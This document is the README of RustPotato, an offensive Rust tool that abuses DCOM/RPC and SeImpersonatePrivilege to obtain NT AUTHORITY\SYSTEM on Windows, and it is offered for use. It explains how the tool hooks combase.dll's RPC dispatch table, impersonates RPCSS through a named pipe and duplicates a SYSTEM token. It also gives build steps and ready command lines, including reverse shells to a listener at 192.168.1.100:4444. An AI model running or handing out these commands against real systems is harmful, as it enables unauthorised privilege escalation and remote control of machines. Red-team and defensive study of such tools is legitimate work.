# RustPotato

**RustPotato** is a Rust-based implementation of [GodPotato](https://github.com/BeichenDream/GodPotato), a privilege escalation tool that abuses **DCOM** and **RPC** to leverage **SeImpersonatePrivilege** and gain `NT AUTHORITY\SYSTEM` privileges on Windows systems.

## Key Features

- **TCP-based Reverse Shell**:  
  RustPotato features a TCP-based reverse shell based on [Rustic64Shell](https://github.com/safedv/Rustic64Shell). It leverages Winsock APIs for network communication and indirect NT APIs for pipe-based I/O redirection, enabling command execution through `cmd` or `powershell`.

- **Indirect NTAPI**:  
  RustPotato leverages indirect NTAPI calls for various operations, including token handling and manipulation.

## Overview

Below is an overview of its execution flow, highlighting key operations at each step:

### 1. **Initialize and Hook RPC Context**

1. **Locate `RPC_SERVER_INTERFACE` Structure**:  
   The tool scans the memory of `combase.dll` to find the `RPC_SERVER_INTERFACE` structure, a critical component for managing RPC communications through the OXID Resolver.

2. **Hook RPC Dispatch Table**:  
   RustPotato replaces the first entry in the `RPC_DISPATCH_TABLE` with a custom function pointer, enabling interception and manipulation of specific RPC calls.

### 2. **Start Named Pipe Server and Trigger RPCSS**

The named pipe server plays a central role in impersonation and privilege escalation:

- **Create Named Pipe**:  
  A named pipe (e.g., `\\.\pipe\RustPotato`) is created with unrestricted access, serving as the endpoint for client connections.

- **Unmarshal COM Object**:  
  RustPotato crafts and unmarshals a COM object, compelling **RPCSS** to establish a connection with the named pipe.

- **Trigger RPCSS**:  
  The unmarshalled object invokes RPC calls that traverse the hooked dispatch table, allowing RustPotato to intercept and manipulate the interactions.

- **Impersonate Client**:  
  When **RPCSS** connects to the named pipe, RustPotato impersonates the client using `ImpersonateNamedPipeClient` to assume its security context.

- **Retrieve SYSTEM Token**:  
  During impersonation, RustPotato locates and duplicates a token associated with the `NT AUTHORITY\SYSTEM` account.

### 3. **Execute Command or Establish Reverse Shell**

- **Execute a Command**:  
  RustPotato uses the duplicated token to execute a specified command, leveraging `CreateProcessWithTokenW`.

- **Establish a Reverse Shell**:  
  With reverse shell options (`-h` and `-p`), RustPotato connects to a listener and executes commands through `cmd` or `powershell`.

### 4. **Restore State and Cleanup**

- **Restore RPC Dispatch Table**:  
  Removes the custom function pointer from the `RPC_DISPATCH_TABLE` and restores the original state in `combase.dll`.

- **Terminate Pipe Server**:  
  Stops the named pipe server, releasing all associated resources and handles.

## Usage

RustPotato provides the following features:

- **`verbose`**: Enables detailed logging during execution.

### Build Options

- **Basic build** (only the process output is printed):

  ```bash
  cargo +nightly-2025-02-14 build --release
  ```

- **Build with verbose logging**:

  ```bash
  cargo +nightly-2025-02-14 build --release --features verbose
  ```

> [!NOTE]
> RustPotato requires Rust nightly 1.86 and supports only x86_64 targets (MSVC or GNU).

### Help

```text
Usage:
  RustPotato.exe [command line] | [options]

Description:
  Execute a command line or start a reverse shell.

Options:
  -h <LHOST>         Specify the IP address of the listener for the reverse shell.
  -p <LPORT>         Specify the port of the listener for the reverse shell.
  -c <cmd|powershell>
                     Specify the shell to be used in the reverse shell (optional, default is cmd).

Examples:
  Execute a command line:
    RustPotato.exe "cmd.exe /c whoami"

  Start a reverse shell with the default shell (cmd):
    RustPotato.exe -h 192.168.1.100 -p 4444

  Start a reverse shell with powershell:
    RustPotato.exe -h 192.168.1.100 -p 4444 -c powershell
```
